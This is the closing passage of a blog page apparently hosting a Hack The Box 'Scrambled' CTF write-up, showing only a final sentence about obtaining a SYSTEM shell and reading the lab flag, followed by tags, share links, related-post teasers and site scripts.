</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/ysoserial3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>System Reverse Shell</em></p><p>We can see how we have a shell as the <code class="language-plaintext highlighter-rouge">nt authority\system</code> user, so we will proceed to visualize the <code class="language-plaintext highlighter-rouge">root.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">C:\Users\Administrator\Desktop</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/silverticket/" class="post-tag no-text-decoration" >silverticket</a> <a href="/tags/mssql/" class="post-tag no-text-decoration" >mssql</a> <a href="/tags/deserialization/" class="post-tag no-text-decoration" >deserialization</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Scrambled+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fscrambled%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Scrambled+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fscrambled%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fscrambled%2F&text=Scrambled+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fscrambled%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/love/"><div class="card-body"> <em class="small" data-ts="1664348400" data-df="ll" > Sep 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Love Write-up</h3><div class="text-muted small"><p> Enumeration Nmap As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved nmap. The scan that we will be using scans all the port range, displ...</p></div></div></a></div><div class="card"> <a href="/posts/bountyhunter/"><div class="card-body"> <em class="small" data-ts="1664262000" data-df="ll" > Sep 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want t...</p></div></div></a></div><div class="card"> <a href="/posts/explore/"><div class="card-body"> <em class="small" data-ts="1664434800" data-df="ll" > Sep 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Explore Write-up</h3><div class="text-muted small"><p> Enumeration Nmap The first thing we will do is enumerate the open ports on the target machine. To do this, we are going to be using nmap. The type of scan that we are going to use scans all the ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cap/" class="btn btn-outline-primary" prompt="Older"><p>Cap Write-up</p></a> <a href="/posts/backdoor/" class="btn btn-outline-primary" prompt="Newer"><p>Backdoor Write-up</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/scrambled/'; this.page.identifier = '/posts/scrambled/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
